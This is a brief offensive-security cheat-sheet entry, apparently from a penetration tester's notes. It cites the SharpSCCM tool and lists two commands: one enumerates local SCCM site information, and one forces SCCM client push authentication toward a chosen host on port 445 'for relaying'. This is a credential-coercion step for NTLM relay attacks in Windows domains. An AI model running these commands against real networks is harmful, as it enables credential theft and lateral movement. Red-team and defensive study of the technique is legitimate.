### Source
https://github.com/Mayyhem/SharpSCCM

### Identify SCCM server on local machine
```
SharpSCCM.exe local siteinfo
```

### Initiate Client Push (for relaying)
```
SharpSCCM.exe <server> <siteCode> invoke client-push -t "<windowsHostNetbiosName>@445"
```

